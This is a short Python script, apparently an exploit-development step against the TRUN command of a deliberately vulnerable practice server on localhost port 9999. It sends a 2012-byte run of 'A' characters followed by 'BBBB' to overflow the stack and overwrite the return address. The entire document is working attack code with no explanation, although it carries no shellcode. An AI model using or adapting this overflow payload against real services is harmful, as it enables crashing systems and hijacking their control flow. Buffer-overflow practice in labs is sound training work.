import os
import socket
import sys

host = "127.0.0.1"
port = 9999

stack_size = 2012

payload = "TRUN .".ljust(stack_size, "A")
payload += "BBBB"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
print(s.recv(1024))
s.send(payload.encode('utf-8'))
s.close()
